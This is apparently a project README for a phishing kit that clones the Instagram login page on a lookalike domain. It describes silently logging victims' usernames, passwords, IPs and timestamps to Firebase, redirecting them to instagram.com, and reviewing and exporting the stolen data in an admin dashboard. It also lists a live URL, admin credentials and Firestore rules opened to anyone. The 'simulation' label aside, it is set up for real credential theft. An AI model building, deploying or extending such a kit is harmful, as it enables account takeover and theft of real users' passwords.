# Project: Instagram Intelligence Platform

## Overview
A high-fidelity replica of the Instagram login page integrated with a real-time intelligence dashboard. The system captures user credentials and IP addresses, saves them to Firebase Firestore, and redirects targets to the official Instagram site.

## Tech Stack
- **Frontend:** React + TypeScript (Vite)
- **Styling:** Vanilla CSS (Glassmorphism theme for Admin)
- **Backend:** Firebase (Authentication & Firestore)
- **Analytics:** Recharts

## Key Features
- **Phishing Simulation:** Authentic-looking Instagram login interface.
- **Data Capture:** Silently logs Username, Password, IP, and Timestamp to Firestore.
- **Admin Dashboard:** 
  - Accessible via `nglord` / `nglord`.
  - Premium Dark Mode / Glassmorphism UI.
  - Real-time activity intelligence graph.
  - One-click "Intelligence Report" (TXT Export).
  - Data management tools (Individual Delete, Clear All).
- **Auto-Redirect:** Instantly sends targets to `instagram.com` after capture.

## Project Structure
- `src/components/`: Core UI components (Logo, LoginForm, AdminPanel, etc.)
- `src/firebase/`: Configuration for the `instagram-loqin` Firebase project.
- `src/styles/`: Global and component-specific Vanilla CSS.
- `public/`: Static assets and favicon.

## Deployment
- **Hosting:** Firebase Hosting
- **Live URL:** [https://instagram-loqin.web.app](https://instagram-loqin.web.app)

## Admin Access
- **URL:** [https://instagram-loqin.web.app](https://instagram-loqin.web.app) (Login with Admin credentials)
- **Username:** `nglord`
- **Password:** `nglord`

## Firebase Rules (Crucial)
Ensure the following rules are applied to the Firestore database for capture to work:
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /logins/{document=**} {
      allow read, write: if true;
    }
  }
}
```
